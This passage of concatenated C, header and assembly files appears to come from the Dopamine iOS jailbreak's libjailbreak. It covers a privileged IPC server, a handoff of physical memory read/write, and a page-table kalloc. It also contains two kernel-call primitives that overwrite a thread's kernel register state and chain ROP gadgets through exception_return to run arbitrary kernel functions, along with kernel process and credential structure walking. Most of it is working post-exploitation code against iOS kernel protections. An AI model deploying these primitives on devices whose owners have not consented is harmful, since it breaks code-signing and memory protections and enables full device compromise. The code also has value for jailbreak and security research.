	for (uint64_t i = 0; action->args[i].name && i < 8; i++) {
		jbserver_arg *argDesc = &action->args[i];
		if (argDesc->out) {
			switch (argDesc->type) {
				case JBS_TYPE_BOOL:
				xpc_dictionary_set_bool(xreply, argDesc->name, (bool)argsOut[i]);
				break;
				case JBS_TYPE_UINT64:
				xpc_dictionary_set_uint64(xreply, argDesc->name, (uint64_t)argsOut[i]);
				break;
				case JBS_TYPE_FD: {
					xpc_dictionary_set_fd(xreply, argDesc->name, (int)(int64_t)argsOut[i]);
					close((int)(int64_t)argsOut[i]);
					break;
				}
				case JBS_TYPE_STRING: {
					if (argsOut[i]) {
						xpc_dictionary_set_string(xreply, argDesc->name, (char *)argsOut[i]);
						free(argsOut[i]);
					}
					break;
				}
				case JBS_TYPE_DATA: {
					if (i < 7) {
						if (argsOut[i] && action->args[i+1].name) {
							xpc_dictionary_set_data(xreply, argDesc->name, (const void *)argsOut[i], (size_t)argsOut[i+1]);
							free(argsOut[i]);
						}
					}
					break;
				}
				case JBS_TYPE_ARRAY:
				case JBS_TYPE_DICTIONARY:
				case JBS_TYPE_XPC_GENERIC: {
					if (argsOut[i]) {
						xpc_dictionary_set_value(xreply, argDesc->name, (xpc_object_t)argsOut[i]);
						xpc_release((xpc_object_t)argsOut[i]);
					}
					break;
				}
				default:
				break;
			}
		}
		else {
			if (argDesc->type == JBS_TYPE_FD) {
				close((int)(int64_t)args[i]);
			}
		}
	}
	xpc_dictionary_set_int64(xreply, "result", result);
	xpc_pipe_routine_reply(xreply);
	xpc_release(xreply);

	return 0;
}

```

`BaseBin/libjailbreak/src/jbserver.h`:

```h
#ifndef JBSERVER_H
#define JBSERVER_H

#include <stdbool.h>
#include <stdint.h>
#include <xpc/xpc.h>
#include <xpc_private.h>
#include "signatures.h"
#include "jbserver_domains.h"

typedef enum {
    JBS_TYPE_BOOL,
	JBS_TYPE_UINT64,
	JBS_TYPE_STRING,
	JBS_TYPE_DATA,
    JBS_TYPE_ARRAY,
	JBS_TYPE_DICTIONARY,
    JBS_TYPE_FD,
	JBS_TYPE_CALLER_TOKEN,
    JBS_TYPE_XPC_GENERIC,
} jbserver_type;

typedef struct s_jbserver_arg
{
    const char *name;
    jbserver_type type;
	bool out;
} jbserver_arg;

struct jbserver_action {
    void *handler;
    jbserver_arg *args;
};

struct jbserver_domain {
    bool (*permissionHandler)(audit_token_t);
    struct jbserver_action actions[];  // Flexible array member moved to the end
};

struct jbserver_impl {
    uint64_t maxDomain;
    struct jbserver_domain **domains;
};

extern struct jbserver_impl gGlobalServer;

int jbserver_received_xpc_message(struct jbserver_impl *server, xpc_object_t xmsg);

#define JBSERVER_MACH_MAGIC 0x444F50414D494E45
#define JBSERVER_MACH_CHECKIN 0
#define JBSERVER_MACH_FORK_FIX 1
#define JBSERVER_MACH_TRUST_FILE 2

struct jbserver_mach_msg {
    mach_msg_header_t hdr;
    uint64_t magic;
    uint64_t action;
};

struct jbserver_mach_msg_reply {
    struct jbserver_mach_msg msg;
    uint64_t status;
};

struct jbserver_mach_msg_checkin {
    struct jbserver_mach_msg base;
};

struct jbserver_mach_msg_checkin_reply {
    struct jbserver_mach_msg_reply base;
    bool fullyDebugged;
    char jbRootPath[PATH_MAX];
    char bootUUID[37];
    char sandboxExtensions[2000];
};

struct jbserver_mach_msg_forkfix {
    struct jbserver_mach_msg base;
    pid_t childPid;
};

struct jbserver_mach_msg_forkfix_reply {
    struct jbserver_mach_msg_reply base;
};

struct jbserver_mach_msg_trust_fd {
    struct jbserver_mach_msg base;
    int64_t fd;
    bool siginfoPopulated;
    struct siginfo siginfo;
};

struct jbserver_mach_msg_trust_fd_reply {
    struct jbserver_mach_msg_reply base;
};

struct jbserver_mach_complex_msg {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
};

#endif

```

`BaseBin/libjailbreak/src/jbserver_boomerang.c`:

```c
#include "jbserver_boomerang.h"
#include "info.h"
#include "kernel.h"
#include "util.h"
#include "primitives.h"
#include "physrw.h"
#include "physrw_pte.h"
#include <bsm/audit.h>

// Implements JBS_DOMAIN_ROOT, but only the functionality required for boomerang
// Exports symbols so that the logic can be reused by launchdhook

static bool boomerang_domain_allowed(audit_token_t clientToken)
{
	// This server is both used from launchd to boomerang and boomerang back to launchd
	// Ensure one of the participants in this communication is launchd
	return (audit_token_to_pid(clientToken) == 1) || (getpid() == 1);
}

int boomerang_get_physrw(audit_token_t *clientToken, bool singlePTE, uint64_t *singlePTEAsidPtr)
{
	int r = -1;
	pid_t pid = audit_token_to_pid(*clientToken);

	thread_caffeinate_start();
	if (singlePTE) {
		r = physrw_pte_handoff(pid, singlePTEAsidPtr);
	}
	else {
		r = physrw_handoff(pid);
	}
	thread_caffeinate_stop();

	return r;
}

int boomerang_sign_thread(audit_token_t *clientToken, mach_port_t threadPort)
{
	pid_t pid = audit_token_to_pid(*clientToken);
	uint64_t proc = proc_find(pid);
	if (proc) {
		int r = sign_kernel_thread(proc, threadPort);
		proc_rele(proc);
		return r;
	}
	return -1;
}

int boomerang_get_sysinfo(xpc_object_t *sysInfoOut)
{
	xpc_object_t sysInfo = xpc_dictionary_create_empty();
	SYSTEM_INFO_SERIALIZE(sysInfo);
	*sysInfoOut = sysInfo;
	return 0;
}

struct jbserver_domain gUnusedDomain = {
	.permissionHandler = NULL,
	.actions = {
		{ 0 },
	},
};

struct jbserver_domain gBoomerangDomain = {
	.permissionHandler = boomerang_domain_allowed,
	.actions = {
		// JBS_ROOT_GET_PHYSRW
		{
			.handler = boomerang_get_physrw,
			.args = (jbserver_arg[]){
				{ .name = "caller-token", .type = JBS_TYPE_CALLER_TOKEN, .out = false },
				{ .name = "single-pte", .type = JBS_TYPE_BOOL, .out = false },
				{ .name = "single-pte-asid-ptr", .type = JBS_TYPE_UINT64, .out = true },
				{ 0 },
			},
		},
		// JBS_ROOT_SIGN_THREAD
		{
			.handler = boomerang_sign_thread,
			.args = (jbserver_arg[]){
				{ .name = "caller-token", .type = JBS_TYPE_CALLER_TOKEN, .out = false },
				{ .name = "thread-port", .type = JBS_TYPE_UINT64, .out = false },
				{ 0 },
			},
		},
		// JBS_ROOT_GET_SYSINFO
		{
			.handler = boomerang_get_sysinfo,
			.args = (jbserver_arg[]){
				{ .name = "sysinfo", .type = JBS_TYPE_DICTIONARY, .out = true },
				{ 0 },
			},
		},
		{ 0 },
	},
};

struct jbserver_impl gBoomerangServer = {
	.maxDomain = 1,
	.domains = (struct jbserver_domain*[]){
		&gUnusedDomain,
		&gUnusedDomain,
		&gUnusedDomain,
		&gBoomerangDomain,
		NULL,
	}
};

int jbserver_received_boomerang_xpc_message(struct jbserver_impl *server, xpc_object_t xmsg)
{
	int r = jbserver_received_xpc_message(server, xmsg);
	if (r != 0) {
		uint64_t action = xpc_dictionary_get_uint64(xmsg, "action");
		if (action == JBS_BOOMERANG_DONE) {
			xpc_object_t xreply = xpc_dictionary_create_reply(xmsg);
			xpc_dictionary_set_uint64(xreply, "result", 0);
			xpc_pipe_routine_reply(xreply);
			xpc_release(xreply);
			return JBS_BOOMERANG_DONE;
		}
	}
	return r;
}

```

`BaseBin/libjailbreak/src/jbserver_boomerang.h`:

```h
#ifndef JBSERVER_BOOMERANG_H
#define JBSERVER_BOOMERANG_H

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>

#include <xpc/xpc.h>
#include <bsm/audit.h>

#include "jbserver.h"

int boomerang_get_physrw(audit_token_t *clientToken, bool singlePTE, uint64_t *singlePTEAsidPtr);
int boomerang_sign_thread(audit_token_t *clientToken, mach_port_t threadPort);
int boomerang_get_sysinfo(xpc_object_t *sysInfoOut);

extern struct jbserver_impl gBoomerangServer;
int jbserver_received_boomerang_xpc_message(struct jbserver_impl *server, xpc_object_t xmsg);

#endif
```

`BaseBin/libjailbreak/src/jbserver_domains.h`:

```h
#ifndef JBSERVER_DOMAINS
#define JBSERVER_DOMAINS

// Domain: System-Wide
// Reachable from all processes
#define JBS_DOMAIN_SYSTEMWIDE 1
enum {
    JBS_SYSTEMWIDE_GET_JBROOT = 1,
    JBS_SYSTEMWIDE_GET_BOOT_UUID,
    JBS_SYSTEMWIDE_TRUST_FILE,
    JBS_SYSTEMWIDE_PROCESS_CHECKIN,
    JBS_SYSTEMWIDE_FORK_FIX,
    JBS_SYSTEMWIDE_CS_REVALIDATE,
    JBS_SYSTEMWIDE_JBSETTINGS_GET,
};

// Domain: Platform
// Reachable from all processes that have CS_PLATFORMIZED or are entitled with platform-application or are the Dopamine app itself
#define JBS_DOMAIN_PLATFORM 2
enum {
    JBS_PLATFORM_SET_PROCESS_DEBUGGED = 1,
    JBS_PLATFORM_STAGE_JAILBREAK_UPDATE,
    JBS_PLATFORM_JBSETTINGS_SET,
    JBS_PLATFORM_SET_SYSTEMWIDE_DOMAIN_ENABLED,
};


// Domain: Watchdog
// Only reachable from watchdogd
#define JBS_DOMAIN_WATCHDOG 3
enum {
    JBS_WATCHDOG_INTERCEPT_USERSPACE_PANIC = 1,
    JBS_WATCHDOG_GET_LAST_USERSPACE_PANIC
};

// Domain: Root
// Only reachable from root processes
#define JBS_DOMAIN_ROOT 4
enum {
    JBS_ROOT_GET_PHYSRW = 1,
    JBS_ROOT_SIGN_THREAD,
    JBS_ROOT_GET_SYSINFO,
    JBS_ROOT_STEAL_UCRED,
    JBS_ROOT_SET_MAC_LABEL,
    JBS_ROOT_TRUSTCACHE_INFO,
    JBS_ROOT_TRUSTCACHE_ADD_CDHASH,
    JBS_ROOT_TRUSTCACHE_CLEAR,
};

#define JBS_BOOMERANG_DONE 42

#endif
```

`BaseBin/libjailbreak/src/kalloc_pt.h`:

```h
#ifndef KALLOC_PT_H
#define KALLOC_PT_H

void libjailbreak_kalloc_pt_init(void);

#endif
```

`BaseBin/libjailbreak/src/kalloc_pt.m`:

```m
#include "kalloc_pt.h"
#include "primitives.h"
#include "translation.h"
#include "util.h"

#import <Foundation/Foundation.h>

// Kalloc implemented via allocating unassigned page tables
// Needed because the IOSurface primitive broke in iOS 16 (no clue why)
// Kinda lazy but works

NSMutableArray *gPool;

int kalloc_global_pt(uint64_t *kaddrOut, uint64_t size)
{
	@autoreleasepool {
		if (!kaddrOut) return -1;
		if (size == 0) return -1;
		if (size > vm_real_kernel_page_size) return -1; // nope
		
		if (gPool.count) {
			NSNumber *poolAllocation = gPool[0];
			[gPool removeObjectAtIndex:0];
			*kaddrOut = [poolAllocation unsignedLongLongValue];
			return 0;
		}
		else {
			uint64_t allocPA = alloc_page_table_unassigned();
			uint64_t allocVA = phystokv(allocPA);
			if (allocVA) {
				*kaddrOut = allocVA;
				return 0;
			}
			return -1;
		}
	}
}

int kfree_global_pt(uint64_t kaddr, uint64_t size)
{
	@autoreleasepool {
		if (!kaddr) return -1;

		// Doesn't seem feasible to free them, what we can do is cache "freed" pages and reuse them later
		// Keep in mind this only works on allocation made by this mechanism
		// Also it only works because there is only one kfree in the entire jailbreak and that works with this
		[gPool addObject:@(kaddr)];
		return 0;
	}
}

void libjailbreak_kalloc_pt_init(void)
{
	gPool = [NSMutableArray new];
	gPrimitives.kalloc_global = kalloc_global_pt;
	gPrimitives.kfree_global = kfree_global_pt;
}
```

`BaseBin/libjailbreak/src/kcall_Fugu14.S`:

```S
.global _pac_loop
_pac_loop:
    mov x0, #1
    adrp x1, _gUserReturnDidHappen@PAGE
    str x0, [x1, _gUserReturnDidHappen@PAGEOFF]
    b _pac_loop
```

`BaseBin/libjailbreak/src/kcall_Fugu14.c`:

```c
#include "kcall_Fugu14.h"

#include "primitives.h"
#include "translation.h"
#include "kernel.h"
#include "util.h"

Fugu14KcallThread gFugu14KcallThread;

uint64_t gUserReturnThreadContext = 0;
volatile uint64_t gUserReturnDidHappen = 0;

uint64_t fugu14_kcall(uint64_t func, int argc, const uint64_t *argv);
void fugu14_kexec(kRegisterState *threadState);
void pac_loop(void);

#define guard(cond) if (__builtin_expect(!!(cond), 1)) {}
#define MEMORY_BARRIER asm volatile("dmb sy");

uint64_t mapKernelPage(uint64_t addr)
{
	uint64_t page       = addr & ~0x3FFFULL;
	uint64_t off        = addr & 0x3FFFULL;
	uint64_t translated = kvtophys(page);
	void *map = NULL;
	if (kmap(translated, 0x4000, &map) == 0) {
		return ((uint64_t)map) + off;
	}
	return -1;
}

uint64_t getUserReturnThreadContext(void)
{
	if (gUserReturnThreadContext != 0) {
		return gUserReturnThreadContext;
	}
	
	arm_thread_state64_t state;
	bzero(&state, sizeof(state));
	
	arm_thread_state64_set_pc_fptr(state, (void*)pac_loop);
	for (size_t i = 0; i < 29; i++) {
		state.__x[i] = 0xDEADBEEF00ULL | i;
	}
	
	thread_t chThread = 0;
	kern_return_t kr = thread_create_running(mach_task_self_, ARM_THREAD_STATE64, (thread_state_t) &state, ARM_THREAD_STATE64_COUNT, &chThread);
	guard (kr == KERN_SUCCESS) else {
		puts("[-] getUserReturnThreadContext: Failed to create return thread!");
		return 0;
	}
	
	thread_suspend(chThread);
	
	//uint64_t returnThreadPtr = TASK_FIRST_THREAD(gOurTask);
	uint64_t returnThreadPtr = task_get_ipc_port_kobject(task_self(), chThread);
	guard (returnThreadPtr != 0) else {
		puts("[-] getUserReturnThreadContext: Failed to find return thread!");
		return 0;
	}
	
	uint64_t returnThreadACTContext = kread_ptr(returnThreadPtr + koffsetof(thread, machine_contextData));
	guard (returnThreadACTContext != 0) else {
		puts("[-] getUserReturnThreadContext: Return thread has no ACT_CONTEXT?!");
		return 0;
	}
	
	gUserReturnThreadContext = returnThreadACTContext;
	
	return returnThreadACTContext;
}

int fugu14_kcall_init(int (^threadSigner)(mach_port_t threadPort))
{
	pthread_mutex_init(&gFugu14KcallThread.lock, NULL);

	// Create a Fugu14-like kcall primitive
	// First we need a new thread
	thread_t thread = 0;
	kern_return_t kr = thread_create(mach_task_self_, &thread);
	guard (kr == KERN_SUCCESS) else {
		puts("[-] fugu14_kcall_init: thread_create failed!");
		return -1;
	}
	
	// Find the thread
	uint64_t threadPtr = task_get_ipc_port_kobject(task_self(), thread);
	guard (threadPtr != 0) else {
		puts("[-] fugu14_kcall_init: Failed to find thread!");
		return -1;
	}
	
	// Get it's state pointer
	uint64_t actContext = kread_ptr(threadPtr + koffsetof(thread, machine_contextData));
	guard (threadPtr != 0) else {
		puts("[-] fugu14_kcall_init: Failed to get thread ACT_CONTEXT!");
		return -1;
	}
	
	// Create a stack
	uint64_t stack = 0;
	if (kalloc_with_options(&stack, 0x4000 * 4, KALLOC_OPTION_LOCAL) != 0) { // Four pages
		puts("[-] fugu14_kcall_init: Failed to allocate stack!");
		return -1;
	}
	stack += 0x8000;
	guard (stack != 0) else {
		puts("[-] fugu14_kcall_init: Failed to alloc kernel stack!");
		return -1;
	}
	
	void *stackMapped = (void *)mapKernelPage(stack);
	kRegisterState *mappedState = (kRegisterState*)((uintptr_t) stackMapped);
	
	/*
	 * We set our signed state like this:
	 * pc  -> Gadget to set TH_KSTACKPTR of this thread
	 *        Required in order to survive br x22 jumps via a fault (fault handler checks stack)
	 * lr  -> Gadget to load a new CPU state
	 * x17 -> Address of br x22 gadget
	 *        We can't load x17 via the load CPU state gadget so we have to include it in the signed state
	 *
	 * Setup:
	 * Set the thread fault handler to our br x22 gadget and immediatly use it to return
	 *
	 * Kcall:
	 * A kcall can be done by jumping to the requested address and returning to a str x0, ...; ldr x??, ...; gadget, making sure the load faults
	 * This will cause the br x22 gadget to be invoked -> Return to user
	 */
	
	// Write register values
	uint64_t str_x8_x9_gadget = kgadget(str_x8_x9);
	uint64_t exception_return_after_check = kgadget(exception_return_after_check);
	uint64_t brX22 = kgadget(br_x22);
	kwrite64(actContext + offsetof(kRegisterState, pc),    str_x8_x9_gadget);
	kwrite32(actContext + offsetof(kRegisterState, cpsr),  CPSR_KERN_INTR_DIS);
	kwrite64(actContext + offsetof(kRegisterState, lr),    exception_return_after_check);
	kwrite64(actContext + offsetof(kRegisterState, x[16]), 0);
	kwrite64(actContext + offsetof(kRegisterState, x[17]), brX22);

	// Sign thread state
	if (threadSigner(thread) != 0) {
		puts("[-] fugu14_kcall_init: Failed to sign thread!");
		return -1;
	}
	
	// Use str x8, [x9] gadget to set TH_KSTACKPTR
	kwrite64(actContext + offsetof(kRegisterState, x[8]), stack + 0x1000ULL);
	kwrite64(actContext + offsetof(kRegisterState, x[9]), threadPtr + koffsetof(thread, machine_kstackptr));
	
	// SP and x0 should both point to the new CPU state
	kwrite64(actContext + offsetof(kRegisterState, sp),   stack);
	kwrite64(actContext + offsetof(kRegisterState, x[0]), stack);
	
	// x2 -> new cpsr
	// Include in signed state since it is rarely changed
	kwrite64(actContext + offsetof(kRegisterState, x[2]), CPSR_KERN_INTR_EN);
	
	// Create a copy of this state
	kreadbuf(actContext, &gFugu14KcallThread.signedState, sizeof(kRegisterState));
	
	// Set a custom recovery handler
	uint64_t hw_lck_ticket_reserve_orig_allow_invalid = ksymbol(hw_lck_ticket_reserve_orig_allow_invalid) + 4;
	
	// x1 -> new pc
	// x3 -> new lr
	kwrite64(actContext + offsetof(kRegisterState, x[1]), hw_lck_ticket_reserve_orig_allow_invalid);
	// We don't need lr here
	
	// New state
	// Force a data abort in hw_lck_ticket_reserve_orig_allow_invalid
	mappedState->x[0] = 0;
	
	// Fault handler is br x22 -> set x22
	mappedState->x[22] = ksymbol(exception_return);
	
	// Exception return expects a signed state in x21
	mappedState->x[21] = getUserReturnThreadContext(); // Guaranteed to not fail at this point
	
	// Also need to set sp
	mappedState->sp = stack;
	
	// Reset flag
	gUserReturnDidHappen = 0;
	
	// Sync all changes
	// (Probably not required)
	MEMORY_BARRIER
	
	// Run the thread
	thread_resume(thread);
	
	// Wait for flag to be set
	while (!gUserReturnDidHappen) ;
	
	// Stop thread
	thread_suspend(thread);
	thread_abort(thread);
	
	// Done!
	// Thread's fault handler is now set to the br x22 gadget
	gFugu14KcallThread.thread              = thread;
	gFugu14KcallThread.actContext          = actContext;
	gFugu14KcallThread.kernelStack         = stack;
	gFugu14KcallThread.mappedState         = mappedState;
	gFugu14KcallThread.scratchMemory       = stack + 0x7000ULL;
	gFugu14KcallThread.scratchMemoryMapped = (uint64_t*) ((uintptr_t) mapKernelPage(stack + 0x4000) + 0x3000);
	gFugu14KcallThread.inited              = true;
	
	gPrimitives.kcall = fugu14_kcall;
	gPrimitives.kexec = fugu14_kexec;
	
	return true;
}

void fugu14_kcall_prepare_state(Fugu14KcallThread *callThread, kRegisterState *threadState)
{
	// Set pc to the function, lr to str x0, [x19]; ldr x??, [x20]; gadget
	threadState->lr = kgadget(str_x0_x19_ldr_x20);

	// New state
	// x19 -> Where to store return value
	threadState->x[19] = callThread->scratchMemory;
	
	// x20 -> NULL (to force data abort)
	threadState->x[20] = 0;
	
	// x22 -> exceptionReturn
	threadState->x[22] = ksymbol(exception_return);
	
	// Exception return expects a signed state in x21
	threadState->x[21] = getUserReturnThreadContext(); // Guaranteed to not fail at this point
	
	// Also need to set sp
	threadState->sp = callThread->kernelStack;
}

uint64_t fugu14_kexec_on_thread_raw_locked(Fugu14KcallThread *callThread, kRegisterState *threadState)
{
	// Restore signed state first
	kwritebuf(callThread->actContext, &callThread->signedState, sizeof(kRegisterState));
	
	// Set all registers based on passed threadState
	kwrite64(callThread->actContext + offsetof(kRegisterState, x[1]), threadState->pc); // x1 -> new pc
	kwrite64(callThread->actContext + offsetof(kRegisterState, x[3]), threadState->lr); // x3 -> new lr
	for (int i = 0; i < 29; i++) {
		callThread->mappedState->x[i] = threadState->x[i];
	}
	callThread->mappedState->sp = threadState->sp;

	// Reset flag
	gUserReturnDidHappen = 0;
	
	// Sync all changes
	// (Probably not required)
	MEMORY_BARRIER
	
	// Run the thread
	thread_resume(callThread->thread);
	
	// Wait for flag to be set
	while (!gUserReturnDidHappen) ;
	
	// Stop thread
	thread_suspend(callThread->thread);
	thread_abort(callThread->thread);
	
	// Sync all changes
	// (Probably not required)
	MEMORY_BARRIER

	// Copy return value
	uint64_t retval = callThread->scratchMemoryMapped[0];

	return retval;
}

uint64_t fugu14_kexec_on_thread_raw(Fugu14KcallThread *callThread, kRegisterState *threadState)
{
	pthread_mutex_lock(&callThread->lock);
	uint64_t r = fugu14_kexec_on_thread_raw_locked(callThread, threadState);
	pthread_mutex_unlock(&callThread->lock);
	return r;
}

uint64_t fugu14_kexec_on_thread(Fugu14KcallThread *callThread, kRegisterState *threadState)
{
	pthread_mutex_lock(&callThread->lock);
	fugu14_kcall_prepare_state(callThread, threadState);
	uint64_t r = fugu14_kexec_on_thread_raw_locked(callThread, threadState);
	pthread_mutex_unlock(&callThread->lock);
	return r;
}

uint64_t fugu14_kcall_on_thread(Fugu14KcallThread *callThread, uint64_t func, uint64_t argc, const uint64_t *argv)
{
	if (argc >= 19) argc = 19;

	pthread_mutex_lock(&callThread->lock);

	kRegisterState threadState = { 0 };
	fugu14_kcall_prepare_state(&gFugu14KcallThread, &threadState);
	threadState.pc = func;

	uint64_t regArgc = 0;
	uint64_t stackArgc = 0;
	if (argc >= 8) {
		regArgc = 8;
		stackArgc = argc - 8;
	}
	else {
		regArgc = argc;
	}

	// Set register args (x0 - x8)
	for (uint64_t i = 0; i < regArgc; i++)
	{
		threadState.x[i] = argv[i];
	}

	// Set stack args
	for (uint64_t i = 0; i < stackArgc; i++)
	{
		uint64_t argKaddr = (threadState.sp + i * 0x8);
		kwrite64(argKaddr, argv[8+i]);
	}

	uint64_t result = fugu14_kexec_on_thread_raw_locked(callThread, &threadState);
	pthread_mutex_unlock(&callThread->lock);
	return result;
}

uint64_t fugu14_kcall(uint64_t func, int argc, const uint64_t *argv)
{
	return fugu14_kcall_on_thread(&gFugu14KcallThread, func, argc, argv);
}

void fugu14_kexec(kRegisterState *state)
{
	fugu14_kexec_on_thread(&gFugu14KcallThread, state);
}

int jbclient_get_fugu14_kcall(void)
{
	if (!gPrimitives.kalloc_local) return -1;
	return fugu14_kcall_init(^int(mach_port_t threadToSign) {
		return jbclient_root_sign_thread(threadToSign);
	});
}
```

`BaseBin/libjailbreak/src/kcall_Fugu14.h`:

```h
#ifndef KCALL_FUGU14_H
#define KCALL_FUGU14_H

#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>
#include <pthread.h>
#include "kernel.h"
#include "primitives.h"

typedef struct {
	bool inited;
	pthread_mutex_t lock;
	thread_t thread;
	uint64_t actContext;
	kRegisterState signedState;
	uint64_t kernelStack;
	kRegisterState *mappedState;
	uint64_t scratchMemory;
	uint64_t *scratchMemoryMapped;
} Fugu14KcallThread;

int fugu14_kcall_init(int (^threadSigner)(mach_port_t threadPort));
int jbclient_get_fugu14_kcall(void);


#endif
```

`BaseBin/libjailbreak/src/kcall_arm64.c`:

```c
#include "kcall_arm64.h"

#include "primitives.h"
#include "translation.h"
#include "kernel.h"
#include "util.h"

// Reuse return logic from Fugu14_Kcall
// I don't like this as it breaks executing multiple threads at the same time
// But as we don't even really do/support that currently anyways, it doesn't matter
uint64_t getUserReturnThreadContext(void);
extern volatile uint64_t gUserReturnDidHappen;

#ifndef __arm64e__

arm64KcallThread gArm64KcallThead;

void arm64_kexec_on_thread_locked(arm64KcallThread *callThread, kRegisterState *threadState)
{
	memcpy(callThread->alignedState, threadState, sizeof(*threadState));

	kRegisterState kcallBootstrapThreadState = { 0 };
	uint64_t threadKptr = task_get_ipc_port_kobject(task_self(), callThread->thread);

	kcallBootstrapThreadState.pc = kgadget(str_x8_x0); // "str x8, [x0]", "ret" gadget
	kcallBootstrapThreadState.lr = ksymbol(exception_return);

	// Kptr to actual thread state that does kcall
	// We use the userland memory here to avoid allocating extra kernel memory

	// The ret of the "str x8, [x0]", "ret" gadget will go to exception_return
	// This will execute the thread state in x21
	kcallBootstrapThreadState.x[21] = phystokv(vtophys(ttep_self(), (uint64_t)callThread->alignedState));

	// Make bootstrap thread set machine.kstackptr based on gadget
	kcallBootstrapThreadState.x[0] = callThread->kernelStack;
	kcallBootstrapThreadState.x[8] = threadKptr + koffsetof(thread, machine_kstackptr);

	// Change cpsr to EL0, to make the thread actually run in kernelspace
	// Interrupts have to be disabled until we have set up the stack, else this will cause random panics
	kcallBootstrapThreadState.cpsr = CPSR_KERN_INTR_DIS;

	kwritebuf(callThread->actContext, &kcallBootstrapThreadState, sizeof(kcallBootstrapThreadState));

	thread_resume(callThread->thread);
}

void arm64_kexec_on_thread(arm64KcallThread *callThread, kRegisterState *threadState)
{
	pthread_mutex_lock(&callThread->lock);
	arm64_kexec_on_thread_locked(callThread, threadState);
	pthread_mutex_unlock(&callThread->lock);
}

void arm64_kcall_prepare_state(arm64KcallThread *callThread, kRegisterState *threadState, uint64_t returnContextKptr, uint64_t *returnStorage)
{
	threadState->x[19] = phystokv(vtophys(ttep_self(), (uint64_t)returnStorage));
	threadState->x[21] = returnContextKptr;

	threadState->lr = kgadget(kcall_return);
	threadState->sp = callThread->kernelStack - 0x20;
	kwrite64(threadState->sp +  0x0, 0);
	kwrite64(threadState->sp +  0x8, 0);
	kwrite64(threadState->sp + 0x10, 0);
	kwrite64(threadState->sp + 0x18, ksymbol(exception_return)); // kcall_return will load this into lr

	threadState->cpsr = CPSR_KERN_INTR_EN;
}

uint64_t arm64_kcall_on_thread(arm64KcallThread *callThread, uint64_t func, int argc, const uint64_t *argv)
{
	// Currently doesn't support more than 8 args
	// Not sure how trivial it would be to support due to kcall_return making some assumptions about the stack
	if (argc > 8) return -1;

	pthread_mutex_lock(&callThread->lock);

	uint64_t retValue = 0;

	kRegisterState threadState = { 0 };
	threadState.pc = func;
	for (int i = 0; i < argc; i++) {
		threadState.x[i] = argv[i];
	}
	arm64_kcall_prepare_state(callThread, &threadState, getUserReturnThreadContext(), &retValue);

	gUserReturnDidHappen = false;

	arm64_kexec_on_thread_locked(callThread, &threadState);

	while (!gUserReturnDidHappen) ;

	thread_suspend(callThread->thread);
	thread_abort(callThread->thread);

	pthread_mutex_unlock(&callThread->lock);

	return retValue;
}

void arm64_kexec(kRegisterState *threadState)
{
	arm64_kexec_on_thread(&gArm64KcallThead, threadState);
}

uint64_t arm64_kcall(uint64_t func, int argc, const uint64_t *argv)
{
	return arm64_kcall_on_thread(&gArm64KcallThead, func, argc, argv);
}

int arm64_kcall_init(void)
{
	if (!gPrimitives.kalloc_local) return -1;
	
	// When doing an OTA update from 2.0.x to >=2.1, we will not have offsets for kcall yet so we can't initialize it
	if (!koffsetof(thread, machine_contextData)) return -1;

	static dispatch_once_t ot;
	dispatch_once(&ot, ^{
		pthread_mutex_init(&gArm64KcallThead.lock, NULL);

		// Kcall thread
		// The thread that we make execute in kernelspace by ovewriting it's cpsr in kernel memory
		thread_create(mach_task_self_, &gArm64KcallThead.thread);
		uint64_t threadKptr = task_get_ipc_port_kobject(task_self(), gArm64KcallThead.thread);
		gArm64KcallThead.actContext = kread_ptr(threadKptr + koffsetof(thread, machine_contextData));

		// In order to do kcalls, we need to make a kernel allocation that is used as the stack
		kalloc_with_options(&gArm64KcallThead.kernelStack, 0x10000, KALLOC_OPTION_LOCAL);
		gArm64KcallThead.kernelStack += 0x8000;

		// Aligned state, we write to this allocation and then we can get the kernel pointer from it to pass to exception_return
		posix_memalign((void **)&gArm64KcallThead.alignedState, vm_real_kernel_page_size, vm_real_kernel_page_size);
	});

	gPrimitives.kcall = arm64_kcall;
	gPrimitives.kexec = arm64_kexec;
	
	return 0;
}

#else

int arm64_kcall_init(void) { return -1; }

#endif
```

`BaseBin/libjailbreak/src/kcall_arm64.h`:

```h
#ifndef KCALL_ARM64_H
#define KCALL_ARM64_H

#ifndef __arm64e__

#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>
#include <pthread.h>
#include "kernel.h"
#include "primitives.h"

typedef struct {
	bool inited;
	pthread_mutex_t lock;
	dispatch_semaphore_t semaphore;
	thread_t thread;
	uint64_t actContext;
	uint64_t kernelStack;
	kRegisterState *alignedState;
} arm64KcallThread;

void arm64_kcall_return(void);

int arm64_kcall_init(void);

#endif

#endif
```

`BaseBin/libjailbreak/src/kernel.c`:

```c
#include "kernel.h"
#include <stdbool.h>
#include "primitives.h"
#include "info.h"
#include "util.h"
#include "codesign.h"
#include <dispatch/dispatch.h>

uint64_t proc_find(pid_t pidToFind)
{
	__block uint64_t foundProc = 0;
	// This sucks a bit due to us not being able to take locks
	// If we don't find anything, just repeat 5 times
	// Attempts to avoids conditions where we got thrown off by modifications
	for (int i = 0; i < 5 && !foundProc; i++) {
		proc_iterate(^(uint64_t proc, bool *stop) {
			pid_t pid = kread32(proc + koffsetof(proc, pid));
			if (pid == pidToFind) {
				foundProc = proc;
				*stop = true;
			}
		});
	}
	return foundProc;
}

int proc_rele(uint64_t proc)
{
	// If proc_find doesn't increment the ref count, there is also no need to decrement it again
	return -1;
}

uint64_t proc_task(uint64_t proc)
{
	if (koffsetof(proc, task)) {
		// iOS <= 15: proc has task attribute
		return kread_ptr(proc + koffsetof(proc, task));
	}
	else {
		// iOS >= 16: task is always at "proc + sizeof(proc)"
		return proc + ksizeof(proc);
	}
}

uint64_t proc_ucred(uint64_t proc)
{
	if (gSystemInfo.kernelStruct.proc_ro.exists) {
		uint64_t proc_ro = kread_ptr(proc + koffsetof(proc, proc_ro));
		return kread_ptr(proc_ro + koffsetof(proc_ro, ucred));
	}
	else {
		return kread_ptr(proc + koffsetof(proc, ucred));
	}
}

uint32_t proc_getcsflags(uint64_t proc)
{
	if (gSystemInfo.kernelStruct.proc_ro.exists) {
		uint64_t proc_ro = kread_ptr(proc + koffsetof(proc, proc_ro));
		return kread32(proc_ro + koffsetof(proc_ro, csflags));
	}
	else {
		return kread32(proc + koffsetof(proc, csflags));
	}
}

void proc_csflags_update(uint64_t proc, uint32_t flags)
{
	if (gSystemInfo.kernelStruct.proc_ro.exists) {
